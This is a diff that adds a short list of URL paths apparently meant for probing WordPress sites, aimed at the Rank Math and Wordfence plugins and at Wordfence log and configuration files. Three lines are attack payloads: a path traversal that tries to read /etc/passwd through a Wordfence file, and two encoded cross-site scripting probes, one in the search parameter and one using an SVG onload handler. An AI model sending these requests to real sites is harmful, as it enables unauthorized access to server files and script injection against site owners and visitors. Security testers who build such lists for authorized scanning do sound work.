@@ -1,0 +1,14 @@
+/wp-content/plugins/seo-by-rank-math/readme.txt
+/wp-content/plugins/wordfence/lib/wordfenceClass.php?file=/../../../../../../etc/passwd
+
+/wp-content/wflogs/
+/wp-content/plugins/wordfence/lib/wflogs/
+/wp-content/plugins/wordfence/tmp/
+/wp-content/plugins/wordfence/wordfence.php
+/wp-content/plugins/wordfence/lib/wfAPI.php
+/wp-content/plugins/wordfence/waf/bootstrap.php
+/wp-content/wflogs/config.php
+/wp-content/wflogs/config-synced.php
+/wp-content/wflogs/rules.php
+/?s=ax6zt%2522%253e%253cscript%253ealert%2528document.domain%2529%253c%252fscript%253ey6uu6
+/wp-content/plugins/wordfence/lib/diffResult.php?file=%27%3E%22%3Csvg%2Fonload=confirm%28%27test%27%29%3E
